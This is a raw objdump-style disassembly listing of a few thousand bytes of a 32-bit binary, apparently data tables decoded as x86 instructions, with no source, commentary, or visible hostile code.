  4081b3:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081b9:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081bf:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081c5:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081cb:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081d1:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081d7:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4081dd:	00 db                	add    %bl,%bl
  4081df:	01 00                	add    %eax,(%eax)
  4081e1:	00 02                	add    %al,(%edx)
  4081e3:	00 a7 02 00 00 03    	add    %ah,0x3000002(%edi)
  4081e9:	00 66 18             	add    %ah,0x18(%esi)
  4081ec:	00 00                	add    %al,(%eax)
  4081ee:	01 00                	add    %eax,(%eax)
  4081f0:	d5 0e                	aad    $0xe
  4081f2:	00 00                	add    %al,(%eax)
  4081f4:	02 00                	add    (%eax),%al
  4081f6:	2b 17                	sub    (%edi),%edx
  4081f8:	00 00                	add    %al,(%eax)
  4081fa:	01 00                	add    %eax,(%eax)
  4081fc:	20 08                	and    %cl,(%eax)
  4081fe:	00 00                	add    %al,(%eax)
  408200:	01 00                	add    %eax,(%eax)
  408202:	e0 09                	loopne 0x40820d
  408204:	00 00                	add    %al,(%eax)
  408206:	02 00                	add    (%eax),%al
  408208:	b8 07 10 10 03       	mov    $0x3101007,%eax
  40820d:	00 2c 17             	add    %ch,(%edi,%edx,1)
  408210:	00 00                	add    %al,(%eax)
  408212:	01 00                	add    %eax,(%eax)
  408214:	67 06                	addr16 push %es
  408216:	00 00                	add    %al,(%eax)
  408218:	01 00                	add    %eax,(%eax)
  40821a:	db 01                	fildl  (%ecx)
  40821c:	00 00                	add    %al,(%eax)
  40821e:	02 00                	add    (%eax),%al
  408220:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408221:	02 00                	add    (%eax),%al
  408223:	00 01                	add    %al,(%ecx)
  408225:	00 1b                	add    %bl,(%ebx)
  408227:	16                   	push   %ss
  408228:	00 00                	add    %al,(%eax)
  40822a:	01 00                	add    %eax,(%eax)
  40822c:	e0 09                	loopne 0x408237
  40822e:	10 10                	adc    %dl,(%eax)
  408230:	02 00                	add    (%eax),%al
  408232:	bb 07 00 00 01       	mov    $0x1000007,%ebx
  408237:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40823d:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408243:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408249:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40824f:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408255:	00 5f 17             	add    %bl,0x17(%edi)
  408258:	00 00                	add    %al,(%eax)
  40825a:	02 00                	add    (%eax),%al
  40825c:	41                   	inc    %ecx
  40825d:	1a 00                	sbb    (%eax),%al
  40825f:	00 01                	add    %al,(%ecx)
  408261:	00 80 0d 00 00 01    	add    %al,0x100000d(%eax)
  408267:	00 80 0d 00 00 01    	add    %al,0x100000d(%eax)
  40826d:	00 db                	add    %bl,%bl
  40826f:	01 00                	add    %eax,(%eax)
  408271:	00 02                	add    %al,(%edx)
  408273:	00 a7 02 00 00 01    	add    %ah,0x1000002(%edi)
  408279:	00 67 06             	add    %ah,0x6(%edi)
  40827c:	00 00                	add    %al,(%eax)
  40827e:	01 00                	add    %eax,(%eax)
  408280:	88 15 00 00 02 00    	mov    %dl,0x20000
  408286:	68 17 00 00 01       	push   $0x1000017
  40828b:	00 67 06             	add    %ah,0x6(%edi)
  40828e:	00 00                	add    %al,(%eax)
  408290:	01 00                	add    %eax,(%eax)
  408292:	67 06                	addr16 push %es
  408294:	10 10                	adc    %dl,(%eax)
  408296:	02 00                	add    (%eax),%al
  408298:	68 17 00 00 01       	push   $0x1000017
  40829d:	00 67 06             	add    %ah,0x6(%edi)
  4082a0:	00 00                	add    %al,(%eax)
  4082a2:	01 00                	add    %eax,(%eax)
  4082a4:	1b 16                	sbb    (%esi),%edx
  4082a6:	00 00                	add    %al,(%eax)
  4082a8:	01 00                	add    %eax,(%eax)
  4082aa:	6a 06                	push   $0x6
  4082ac:	00 00                	add    %al,(%eax)
  4082ae:	01 00                	add    %eax,(%eax)
  4082b0:	a0 09 00 00 01       	mov    0x1000009,%al
  4082b5:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4082bb:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4082c1:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4082c7:	00 db                	add    %bl,%bl
  4082c9:	15 00 00 01 00       	adc    $0x10000,%eax
  4082ce:	28 08                	sub    %cl,(%eax)
  4082d0:	00 00                	add    %al,(%eax)
  4082d2:	01 00                	add    %eax,(%eax)
  4082d4:	b7 12                	mov    $0x12,%bh
  4082d6:	00 00                	add    %al,(%eax)
  4082d8:	02 00                	add    (%eax),%al
  4082da:	83 0d 00 00 01 00 db 	orl    $0xffffffdb,0x10000
  4082e1:	15 00 00 01 00       	adc    $0x10000,%eax
  4082e6:	a0 09 00 00 01       	mov    0x1000009,%al
  4082eb:	00 b0 18 00 00 01    	add    %dh,0x1000018(%eax)
  4082f1:	00 3f                	add    %bh,(%edi)
  4082f3:	0c 00                	or     $0x0,%al
  4082f5:	00 01                	add    %al,(%ecx)
  4082f7:	00 3f                	add    %bh,(%edi)
  4082f9:	0c 00                	or     $0x0,%al
  4082fb:	20 00                	and    %al,(%eax)
  4082fd:	00 00                	add    %al,(%eax)
  4082ff:	00 00                	add    %al,(%eax)
  408301:	00 01                	add    %al,(%ecx)
  408303:	00 c8                	add    %cl,%al
  408305:	07                   	pop    %es
  408306:	00 00                	add    %al,(%eax)
  408308:	02 00                	add    (%eax),%al
  40830a:	86 19                	xchg   %bl,(%ecx)
  40830c:	00 00                	add    %al,(%eax)
  40830e:	03 00                	add    (%eax),%eax
  408310:	66 18 00             	data16 sbb %al,(%eax)
  408313:	00 01                	add    %al,(%ecx)
  408315:	00 c8                	add    %cl,%al
  408317:	07                   	pop    %es
  408318:	00 00                	add    %al,(%eax)
  40831a:	01 00                	add    %eax,(%eax)
  40831c:	c8 07 02 00          	enter  $0x207,$0x0
  408320:	02 00                	add    (%eax),%al
  408322:	46                   	inc    %esi
  408323:	07                   	pop    %es
  408324:	00 00                	add    %al,(%eax)
  408326:	01 00                	add    %eax,(%eax)
  408328:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408329:	0e                   	push   %cs
  40832a:	00 00                	add    %al,(%eax)
  40832c:	01 00                	add    %eax,(%eax)
  40832e:	f0 16                	lock push %ss
  408330:	00 00                	add    %al,(%eax)
  408332:	01 00                	add    %eax,(%eax)
  408334:	2d 0e 00 00 01       	sub    $0x100000e,%eax
  408339:	00 d6                	add    %dl,%dh
  40833b:	0e                   	push   %cs
  40833c:	00 00                	add    %al,(%eax)
  40833e:	02 00                	add    (%eax),%al
  408340:	68 1a 10 10 03       	push   $0x310101a
  408345:	00 e0                	add    %ah,%al
  408347:	09 10                	or     %edx,(%eax)
  408349:	10 04 00             	adc    %al,(%eax,%eax,1)
  40834c:	19 06                	sbb    %eax,(%esi)
  40834e:	10 10                	adc    %dl,(%eax)
  408350:	05 00 2c 17 00       	add    $0x172c00,%eax
  408355:	00 01                	add    %al,(%ecx)
  408357:	00 3f                	add    %bh,(%edi)
  408359:	0e                   	push   %cs
  40835a:	00 00                	add    %al,(%eax)
  40835c:	01 00                	add    %eax,(%eax)
  40835e:	3f                   	aas
  40835f:	0e                   	push   %cs
  408360:	10 10                	adc    %dl,(%eax)
  408362:	02 00                	add    (%eax),%al
  408364:	3b 09                	cmp    (%ecx),%ecx
  408366:	00 00                	add    %al,(%eax)
  408368:	01 00                	add    %eax,(%eax)
  40836a:	3f                   	aas
  40836b:	0e                   	push   %cs
  40836c:	10 10                	adc    %dl,(%eax)
  40836e:	02 00                	add    (%eax),%al
  408370:	3b 09                	cmp    (%ecx),%ecx
  408372:	00 00                	add    %al,(%eax)
  408374:	01 00                	add    %eax,(%eax)
  408376:	a0 09 00 00 01       	mov    0x1000009,%al
  40837b:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408381:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408387:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40838d:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408393:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408399:	00 a0 09 04 00 1d    	add    %ah,0x1d000409(%eax)
  40839f:	00 07                	add    %al,(%edi)
  4083a1:	00 1d 00 08 00 1d    	add    %bl,0x1d000800
  4083a7:	00 09                	add    %cl,(%ecx)
  4083a9:	00 1d 00 0a 00 1d    	add    %bl,0x1d000a00
  4083af:	00 0b                	add    %cl,(%ebx)
  4083b1:	00 1d 00 0c 00 1d    	add    %bl,0x1d000c00
  4083b7:	00 0d 00 1d 00 0e    	add    %cl,0xe001d00
  4083bd:	00 1d 00 10 00 1d    	add    %bl,0x1d001000
  4083c3:	00 11                	add    %dl,(%ecx)
  4083c5:	00 1d 00 12 00 1d    	add    %bl,0x1d001200
  4083cb:	00 13                	add    %dl,(%ebx)
  4083cd:	00 1d 00 14 00 1d    	add    %bl,0x1d001400
  4083d3:	00 18                	add    %bl,(%eax)
  4083d5:	00 1d 00 19 00 1d    	add    %bl,0x1d001900
  4083db:	00 1a                	add    %bl,(%edx)
  4083dd:	00 1d 00 1b 00 1d    	add    %bl,0x1d001b00
  4083e3:	00 1d 00 1d 00 24    	add    %bl,0x24001d00
  4083e9:	00 1d 00 25 00 1d    	add    %bl,0x1d002500
  4083ef:	00 26                	add    %ah,(%esi)
  4083f1:	00 1d 00 27 00 1d    	add    %bl,0x1d002700
  4083f7:	00 28                	add    %ch,(%eax)
  4083f9:	00 1d 00 29 00 1d    	add    %bl,0x1d002900
  4083ff:	00 2a                	add    %ch,(%edx)
  408401:	00 1d 00 39 00 56    	add    %bl,0x56003900
  408407:	19 52 00             	sbb    %edx,0x0(%edx)
  40840a:	39 00                	cmp    %eax,(%eax)
  40840c:	90                   	nop
  40840d:	09 9e 00 d9 00 7b    	or     %ebx,0x7b00d900(%esi)
  408413:	14 48                	adc    $0x48,%al
  408415:	01 e1                	add    %esp,%ecx
  408417:	00 7b 14             	add    %bh,0x14(%ebx)
  40841a:	52                   	push   %edx
  40841b:	00 e9                	add    %ch,%cl
  40841d:	00 7b 14             	add    %bh,0x14(%ebx)
  408420:	04 03                	add    $0x3,%al
  408422:	f9                   	stc
  408423:	00 7b 14             	add    %bh,0x14(%ebx)
  408426:	03 02                	add    (%edx),%eax
  408428:	01 01                	add    %eax,(%ecx)
  40842a:	7b 14                	jnp    0x408440
  40842c:	03 02                	add    (%edx),%eax
  40842e:	09 01                	or     %eax,(%ecx)
  408430:	7b 14                	jnp    0x408446
  408432:	03 02                	add    (%edx),%eax
  408434:	11 01                	adc    %eax,(%ecx)
  408436:	7b 14                	jnp    0x40844c
  408438:	03 02                	add    (%edx),%eax
  40843a:	19 01                	sbb    %eax,(%ecx)
  40843c:	7b 14                	jnp    0x408452
  40843e:	03 02                	add    (%edx),%eax
  408440:	21 01                	and    %eax,(%ecx)
  408442:	7b 14                	jnp    0x408458
  408444:	03 02                	add    (%edx),%eax
  408446:	29 01                	sub    %eax,(%ecx)
  408448:	7b 14                	jnp    0x40845e
  40844a:	03 02                	add    (%edx),%eax
  40844c:	31 01                	xor    %eax,(%ecx)
  40844e:	7b 14                	jnp    0x408464
  408450:	46                   	inc    %esi
  408451:	03 39                	add    (%ecx),%edi
  408453:	01 7b 14             	add    %edi,0x14(%ebx)
  408456:	03 02                	add    (%edx),%eax
  408458:	41                   	inc    %ecx
  408459:	01 7b 14             	add    %edi,0x14(%ebx)
  40845c:	03 02                	add    (%edx),%eax
  40845e:	49                   	dec    %ecx
  40845f:	01 7b 14             	add    %edi,0x14(%ebx)
  408462:	03 02                	add    (%edx),%eax
  408464:	51                   	push   %ecx
  408465:	01 7b 14             	add    %edi,0x14(%ebx)
  408468:	cc                   	int3
  408469:	03 61 01             	add    0x1(%ecx),%esp
  40846c:	7b 14                	jnp    0x408482
  40846e:	52                   	push   %edx
  40846f:	00 69 01             	add    %ch,0x1(%ecx)
  408472:	7b 14                	jnp    0x408488
  408474:	52                   	push   %edx
  408475:	00 79 01             	add    %bh,0x1(%ecx)
  408478:	7b 14                	jnp    0x40848e
  40847a:	0a 09                	or     (%ecx),%cl
  40847c:	81 01 7e 0d 0f 09    	addl   $0x90f0d7e,(%ecx)
  408482:	09 00                	or     %eax,(%eax)
  408484:	7b 14                	jnp    0x40849a
  408486:	52                   	push   %edx
  408487:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40848a:	7b 14                	jnp    0x4084a0
  40848c:	52                   	push   %edx
  40848d:	00 89 01 1f 10 2b    	add    %cl,0x2b101f01(%ecx)
  408493:	09 91 01 7b 14 31    	or     %edx,0x31147b01(%ecx)
  408499:	09 89 01 79 0c 37    	or     %ecx,0x370c7901(%ecx)
  40849f:	09 41 00             	or     %eax,0x0(%ecx)
  4084a2:	25 0a 43 09 41       	and    $0x4109430a,%eax
  4084a7:	00 88 18 48 09 41    	add    %cl,0x41094818(%eax)
  4084ad:	00 db                	add    %bl,%bl
  4084af:	0e                   	push   %cs
  4084b0:	c2 00 29             	ret    $0x2900
  4084b3:	00 c7                	add    %al,%bh
  4084b5:	08 08                	or     %cl,(%eax)
  4084b7:	02 99 01 7b 14 03    	add    0x3147b01(%ecx),%bl
  4084bd:	02 99 01 c7 08 08    	add    0x808c701(%ecx),%bl
  4084c3:	02 a1 01 22 1b 55    	add    0x551b2201(%ecx),%ah
  4084c9:	09 19                	or     %ebx,(%ecx)
  4084cb:	00 89 1a 5b 09 14    	add    %cl,0x14095b1a(%ecx)
  4084d1:	00 04 14             	add    %al,(%esp,%edx,1)
  4084d4:	84 09                	test   %cl,(%ecx)
  4084d6:	1c 00                	sbb    $0x0,%al
  4084d8:	a8 07                	test   $0x7,%al
  4084da:	29 01                	sub    %eax,(%ecx)
  4084dc:	41                   	inc    %ecx
  4084dd:	00 91 07 94 09 1c    	add    %dl,0x1c099407(%ecx)
  4084e3:	00 99 17 aa 09 c1    	add    %bl,-0x3ef655e9(%ecx)
  4084e9:	00 23                	add    %ah,(%ebx)
  4084eb:	05 af 09 c1 00       	add    $0xc109af,%eax
  4084f0:	f5                   	cmc
  4084f1:	0d b4 09 a9 01       	or     $0x1a909b4,%eax
  4084f6:	67 09 ba 09 0c       	or     %edi,0xc09(%bp,%si)
  4084fb:	00 50 1a             	add    %dl,0x1a(%eax)
  4084fe:	bf 09 24 00 04       	mov    $0x4002409,%edi
  408503:	14 84                	adc    $0x84,%al
  408505:	09 2c 00             	or     %ebp,(%eax,%eax,1)
  408508:	a8 07                	test   $0x7,%al
  40850a:	29 01                	sub    %eax,(%ecx)
  40850c:	2c 00                	sub    $0x0,%al
  40850e:	99                   	cltd
  40850f:	17                   	pop    %ss
  408510:	aa                   	stos   %al,%es:(%edi)
  408511:	09 a9 01 67 09 db    	or     %ebp,-0x24f698ff(%ecx)
  408517:	09 19                	or     %ebx,(%ecx)
  408519:	00 6f 07             	add    %ch,0x7(%edi)
  40851c:	e0 09                	loopne 0x408527
  40851e:	0c 00                	or     $0x0,%al
  408520:	9f                   	lahf
  408521:	0f e7 09             	movntq %mm1,(%ecx)
  408524:	0c 00                	or     $0x0,%al
  408526:	96                   	xchg   %eax,%esi
  408527:	0f ef 09             	pxor   (%ecx),%mm1
  40852a:	19 00                	sbb    %eax,(%eax)
  40852c:	cd 09                	int    $0x9
  40852e:	f6 09 b1             	testb  $0xb1,(%ecx)
  408531:	01 f5                	add    %esi,%ebp
  408533:	07                   	pop    %es
  408534:	fd                   	std
  408535:	09 09                	or     %ecx,(%ecx)
  408537:	00 cd                	add    %cl,%ch
  408539:	09 04 0a             	or     %eax,(%edx,%ecx,1)
  40853c:	59                   	pop    %ecx
  40853d:	01 d4                	add    %edx,%esp
  40853f:	07                   	pop    %es
  408540:	0a 0a                	or     (%edx),%cl
  408542:	c9                   	leave
  408543:	01 4c 08 14          	add    %ecx,0x14(%eax,%ecx,1)
  408547:	0a 21                	or     (%ecx),%ah
  408549:	00 04 14             	add    %al,(%esp,%edx,1)
  40854c:	1b 0a                	sbb    (%edx),%ecx
  40854e:	51                   	push   %ecx
  40854f:	00 a8 07 29 01 51    	add    %ch,0x51012907(%eax)
  408555:	00 99 17 52 00 59    	add    %bl,0x59005217(%ecx)
  40855b:	00 40 08             	add    %al,0x8(%eax)
  40855e:	08 02                	or     %al,(%edx)
  408560:	c1 00 72             	roll   $0x72,(%eax)
  408563:	15 27 0a 59 00       	adc    $0x590a27,%eax
  408568:	e6 07                	out    %al,$0x7
  40856a:	08 02                	or     %al,(%edx)
  40856c:	41                   	inc    %ecx
  40856d:	00 4b 11             	add    %cl,0x11(%ebx)
  408570:	2d 0a 41 00 a3       	sub    $0xa300410a,%eax
  408575:	17                   	pop    %ss
  408576:	52                   	push   %edx
  408577:	00 41 00             	add    %al,0x0(%ecx)
  40857a:	90                   	nop
  40857b:	09 9e 00 d1 01 25    	or     %ebx,0x2501d100(%esi)
  408581:	0a 46 0a             	or     0xa(%esi),%al
  408584:	f1                   	int1
  408585:	01 22                	add    %esp,(%edx)
  408587:	1a 4c 0a f1          	sbb    -0xf(%edx,%ecx,1),%cl
  40858b:	01 60 06             	add    %esp,0x6(%eax)
  40858e:	4c                   	dec    %esp
  40858f:	0a f1                	or     %cl,%dh
  408591:	01 1a                	add    %ebx,(%edx)
  408593:	1a 52 0a             	sbb    0xa(%edx),%dl
  408596:	f1                   	int1
  408597:	01 59 06             	add    %ebx,0x6(%ecx)
  40859a:	52                   	push   %edx
  40859b:	0a f1                	or     %cl,%dh
  40859d:	01 98 14 57 0a e1    	add    %ebx,-0x1ef5a8ec(%eax)
  4085a3:	01 7b 14             	add    %edi,0x14(%ebx)
  4085a6:	52                   	push   %edx
  4085a7:	00 e9                	add    %ch,%cl
  4085a9:	01 7b 14             	add    %edi,0x14(%ebx)
  4085ac:	61                   	popa
  4085ad:	0a f9                	or     %cl,%bh
  4085af:	01 3e                	add    %edi,(%esi)
  4085b1:	0a 6e 0a             	or     0xa(%esi),%ch
  4085b4:	e9 01 c5 0e 52       	jmp    0x524f4aba
  4085b9:	00 e1                	add    %ah,%cl
  4085bb:	01 12                	add    %edx,(%edx)
  4085bd:	1a 52 0a             	sbb    0xa(%edx),%dl
  4085c0:	09 02                	or     %eax,(%edx)
  4085c2:	13 0a                	adc    (%edx),%ecx
  4085c4:	52                   	push   %edx
  4085c5:	00 f1                	add    %dh,%cl
  4085c7:	01 88 14 57 0a 34    	add    %ecx,0x340a5714(%eax)
  4085cd:	00 7b 14             	add    %bh,0x14(%ebx)
  4085d0:	31 09                	xor    %ecx,(%ecx)
  4085d2:	3c 00                	cmp    $0x0,%al
  4085d4:	04 14                	add    $0x14,%al
  4085d6:	84 09                	test   %cl,(%ecx)
  4085d8:	44                   	inc    %esp
  4085d9:	00 a8 07 29 01 44    	add    %ch,0x44012907(%eax)
  4085df:	00 99 17 aa 09 71    	add    %bl,0x7109aa17(%ecx)
  4085e5:	01 ec                	add    %ebp,%esp
  4085e7:	0d 08 02 a1 01       	or     $0x1a10208,%eax
  4085ec:	c2 16 01             	ret    $0x116
  4085ef:	0b 0c 00             	or     (%eax,%eax,1),%ecx
  4085f2:	b9 16 17 0b a1       	mov    $0xa10b1716,%ecx
  4085f7:	01 6e 10             	add    %ebp,0x10(%esi)
  4085fa:	23 0b                	and    (%ebx),%ecx
  4085fc:	19 02                	sbb    %eax,(%edx)
  4085fe:	ef                   	out    %eax,(%dx)
  4085ff:	11 37                	adc    %esi,(%edi)
  408601:	0b 19                	or     (%ecx),%ebx
  408603:	02 12                	add    (%edx),%dl
  408605:	1a 48 0b             	sbb    0xb(%eax),%cl
  408608:	19 02                	sbb    %eax,(%edx)
  40860a:	1e                   	push   %ds
  40860b:	16                   	push   %ss
  40860c:	55                   	push   %ebp
  40860d:	0b 0c 00             	or     (%eax,%eax,1),%ecx
  408610:	ab                   	stos   %eax,%es:(%edi)
  408611:	0c bf                	or     $0xbf,%al
  408613:	09 09                	or     %ecx,(%ecx)
  408615:	00 ec                	add    %ch,%ah
  408617:	0d 08 02 21 02       	or     $0x2210208,%eax
  40861c:	09 09                	or     %ecx,(%ecx)
  40861e:	44                   	inc    %esp
  40861f:	02 29                	add    (%ecx),%ch
  408621:	02 1d 18 7c 0b 31    	add    0x310b7c18,%bl
  408627:	02 c7                	add    %bh,%al
  408629:	08 08                	or     %cl,(%eax)
  40862b:	02 39                	add    (%ecx),%bh
  40862d:	02 ec                	add    %ah,%ch
  40862f:	0d 08 02 4c 00       	or     $0x4c0208,%eax
  408634:	04 14                	add    $0x14,%al
  408636:	84 09                	test   %cl,(%ecx)
  408638:	54                   	push   %esp
  408639:	00 a8 07 29 01 54    	add    %ch,0x54012907(%eax)
  40863f:	00 99 17 aa 09 5c    	add    %bl,0x5c09aa17(%ecx)
  408645:	00 04 14             	add    %al,(%esp,%edx,1)
  408648:	84 09                	test   %cl,(%ecx)
  40864a:	64 00 a8 07 29 01 64 	add    %ch,%fs:0x64012907(%eax)
  408651:	00 99 17 aa 09 41    	add    %bl,0x4109aa17(%ecx)
  408657:	02 ec                	add    %ah,%ch
  408659:	0d 08 02 a1 01       	or     $0x1a10208,%eax
  40865e:	c2 16 d3             	ret    $0xd316
  408661:	0b d1                	or     %ecx,%edx
  408663:	00 5e 16             	add    %bl,0x16(%esi)
  408666:	09 0c d1             	or     %ecx,(%ecx,%edx,8)
  408669:	00 6a 0f             	add    %ch,0xf(%edx)
  40866c:	52                   	push   %edx
  40866d:	00 19                	add    %bl,(%ecx)
  40866f:	00 9e 1a 5b 09 19    	add    %bl,0x19095b1a(%esi)
  408675:	00 9f 10 08 02 d1    	add    %bl,-0x2efdf7f0(%edi)
  40867b:	00 88 18 0e 0c 21    	add    %cl,0x210c0e18(%eax)
  408681:	00 f6                	add    %dh,%dh
  408683:	19 2b                	sbb    %ebp,(%ebx)
  408685:	0c 6c                	or     $0x6c,%al
  408687:	00 7b 14             	add    %bh,0x14(%ebx)
  40868a:	52                   	push   %edx
  40868b:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40868f:	07                   	pop    %es
  408690:	7d 0c                	jge    0x40869e
  408692:	89 00                	mov    %eax,(%eax)
  408694:	25 0a 88 0c 89       	and    $0x890c880a,%eax
  408699:	00 88 18 48 09 74    	add    %cl,0x74094818(%eax)
  40869f:	00 25 0a 9e 0c 74    	add    %ah,0x740c9e0a
  4086a5:	00 88 18 48 09 74    	add    %cl,0x74094818(%eax)
  4086ab:	00 db                	add    %bl,%bl
  4086ad:	0e                   	push   %cs
  4086ae:	ac                   	lods   %ds:(%esi),%al
  4086af:	0c 81                	or     $0x81,%al
  4086b1:	00 83 07 29 01 7c    	add    %al,0x7c012907(%ebx)
  4086b7:	00 25 0a 9e 0c 7c    	add    %ah,0x7c0c9e0a
  4086bd:	00 88 18 48 09 7c    	add    %cl,0x7c094818(%eax)
  4086c3:	00 db                	add    %bl,%bl
  4086c5:	0e                   	push   %cs
  4086c6:	ac                   	lods   %ds:(%esi),%al
  4086c7:	0c 84                	or     $0x84,%al
  4086c9:	00 25 0a 9e 0c 84    	add    %ah,0x840c9e0a
  4086cf:	00 88 18 48 09 84    	add    %cl,-0x7bf6b7e8(%eax)
  4086d5:	00 db                	add    %bl,%bl
  4086d7:	0e                   	push   %cs
  4086d8:	ac                   	lods   %ds:(%esi),%al
  4086d9:	0c 49                	or     $0x49,%al
  4086db:	02 02                	add    (%edx),%al
  4086dd:	1a ff                	sbb    %bh,%bh
  4086df:	0c 84                	or     $0x84,%al
  4086e1:	00 91 07 94 09 84    	add    %dl,-0x7bf66bf9(%ecx)
  4086e7:	00 4b 11             	add    %cl,0x11(%ebx)
  4086ea:	2d 0a 84 00 a3       	sub    $0xa300840a,%eax
  4086ef:	17                   	pop    %ss
  4086f0:	7d 0c                	jge    0x4086fe
  4086f2:	84 00                	test   %al,(%eax)
  4086f4:	90                   	nop
  4086f5:	09 9e 00 81 00 7b    	or     %ebx,0x7b008100(%esi)
  4086fb:	14 3e                	adc    $0x3e,%al
  4086fd:	0d 81 00 28 18       	or     $0x18280081,%eax
  408702:	4b                   	dec    %ebx
  408703:	0d 79 02 01 07       	or     $0x7010279,%eax
  408708:	51                   	push   %ecx
  408709:	0d 74 00 91 07       	or     $0x7910074,%eax
  40870e:	94                   	xchg   %eax,%esp
  40870f:	09 74 00 4b          	or     %esi,0x4b(%eax,%eax,1)
  408713:	11 2d 0a 74 00 a3    	adc    %ebp,0xa300740a
  408719:	17                   	pop    %ss
  40871a:	7d 0c                	jge    0x408728
  40871c:	74 00                	je     0x40871e
  40871e:	90                   	nop
  40871f:	09 9e 00 21 00 d2    	or     %ebx,-0x2dffdf00(%esi)
  408725:	1a 8e 0d 81 00 39    	sbb    0x3900810d(%esi),%cl
  40872b:	17                   	pop    %ss
  40872c:	94                   	xchg   %eax,%esp
  40872d:	0d 8c 00 7b 14       	or     $0x147b008c,%eax
  408732:	31 09                	xor    %ecx,(%ecx)
  408734:	81 00 1d 17 ad 0d    	addl   $0xdad171d,(%eax)
  40873a:	94                   	xchg   %eax,%esp
  40873b:	00 7b 14             	add    %bh,0x14(%ebx)
  40873e:	31 09                	xor    %ecx,(%ecx)
  408740:	89 02                	mov    %eax,(%edx)
  408742:	e2 06                	loop   0x40874a
  408744:	bc 0d 89 00 91       	mov    $0x9100890d,%esp
  408749:	07                   	pop    %es
  40874a:	94                   	xchg   %eax,%esp
  40874b:	09 81 00 0d 0a 48    	or     %eax,0x480a0d00(%ecx)
  408751:	01 81 00 13 0a 52    	add    %eax,0x520a1300(%ecx)
  408757:	00 19                	add    %bl,(%ecx)
  408759:	02 a1 18 e5 0d 6c    	add    0x6c0de518(%ecx),%ah
  40875f:	00 1f                	add    %bl,(%edi)
  408761:	12 52 00             	adc    0x0(%edx),%dl
  408764:	6c                   	insb   (%dx),%es:(%edi)
  408765:	00 63 14             	add    %ah,0x14(%ebx)
  408768:	fa                   	cli
  408769:	0d 9c 00 11 18       	or     $0x1811009c,%eax
  40876e:	aa                   	stos   %al,%es:(%edi)
  40876f:	09 9c 00 56 19 29 01 	or     %ebx,0x1291956(%eax,%eax,1)
  408776:	34 00                	xor    $0x0,%al
  408778:	4c                   	dec    %esp
  408779:	08 7d 0c             	or     %bh,0xc(%ebp)
  40877c:	89 00                	mov    %eax,(%eax)
  40877e:	4b                   	dec    %ebx
  40877f:	11 2d 0a 89 00 a3    	adc    %ebp,0xa300890a
  408785:	17                   	pop    %ss
  408786:	52                   	push   %edx
  408787:	00 89 00 90 09 9e    	add    %cl,-0x61f67000(%ecx)
  40878d:	00 7c 00 91          	add    %bh,-0x6f(%eax,%eax,1)
  408791:	07                   	pop    %es
  408792:	94                   	xchg   %eax,%esp
  408793:	09 7c 00 4b          	or     %edi,0x4b(%eax,%eax,1)
  408797:	11 2d 0a 7c 00 a3    	adc    %ebp,0xa3007c0a
  40879d:	17                   	pop    %ss
  40879e:	7d 0c                	jge    0x4087ac
  4087a0:	7c 00                	jl     0x4087a2
  4087a2:	90                   	nop
  4087a3:	09 9e 00 81 00 f0    	or     %ebx,-0xfff7f00(%esi)
  4087a9:	19 46 03             	sbb    %eax,0x3(%esi)
  4087ac:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4087ad:	00 7b 14             	add    %bh,0x14(%ebx)
  4087b0:	52                   	push   %edx
  4087b1:	00 a4 00 74 07 7d 0c 	add    %ah,0xc7d0774(%eax,%eax,1)
  4087b8:	ac                   	lods   %ds:(%esi),%al
  4087b9:	00 7b 14             	add    %bh,0x14(%ebx)
  4087bc:	31 09                	xor    %ecx,(%ecx)
  4087be:	19 02                	sbb    %eax,(%edx)
  4087c0:	bd 1a 68 0e a9       	mov    $0xa90e681a,%ebp
  4087c5:	02 c8                	add    %al,%cl
  4087c7:	1a 94 0e b1 02 f7 0f 	sbb    0xff702b1(%esi,%ecx,1),%dl
  4087ce:	76 01                	jbe    0x4087d1
  4087d0:	81 00 c3 18 48 01    	addl   $0x14818c3,(%eax)
  4087d6:	a1 00 a2 19 ef       	mov    0xef19a200,%eax
  4087db:	0e                   	push   %cs
  4087dc:	81 00 53 08 f4 0e    	addl   $0xef40853,(%eax)
  4087e2:	b4 00                	mov    $0x0,%ah
  4087e4:	7b 14                	jnp    0x4087fa
  4087e6:	ff 0e                	decl   (%esi)
  4087e8:	79 02                	jns    0x4087ec
  4087ea:	c1 06 08             	roll   $0x8,(%esi)
  4087ed:	0f bc 00             	bsf    (%eax),%eax
  4087f0:	04 14                	add    $0x14,%al
  4087f2:	84 09                	test   %cl,(%ecx)
  4087f4:	c4 00                	les    (%eax),%eax
  4087f6:	a8 07                	test   $0x7,%al
  4087f8:	29 01                	sub    %eax,(%ecx)
  4087fa:	c4 00                	les    (%eax),%eax
  4087fc:	99                   	cltd
  4087fd:	17                   	pop    %ss
  4087fe:	aa                   	stos   %al,%es:(%edi)
  4087ff:	09 a1 00 b3 10 31    	or     %esp,0x3110b300(%ecx)
  408805:	0f b9 02             	ud1    (%edx),%eax
  408808:	c2 14 3b             	ret    $0x3b14
  40880b:	0f b4 00             	lfs    (%eax),%eax
  40880e:	7b 14                	jnp    0x408824
  408810:	3f                   	aas
  408811:	0f 79 02             	vmwrite (%edx),%eax
  408814:	94                   	xchg   %eax,%esp
